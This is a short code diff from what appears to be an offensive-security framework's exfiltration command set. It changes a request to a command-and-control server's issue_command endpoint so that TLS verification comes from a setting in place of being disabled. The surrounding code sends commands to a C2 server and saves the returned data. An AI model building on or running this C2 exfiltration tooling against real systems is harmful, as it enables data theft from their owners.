@@ -1151,7 +1151,7 @@ class ExfiltrationCommandSet(LazyOwnCommandSet):
             f"{self.c2_url}/issue_command",
             auth=self.c2_auth,
             data=data,
-            verify=False,  # noqa: S501
+            verify=self.c2_tls_verify,
         )
         if response.status_code == 200:
             with open(output_path, "wb") as handle:
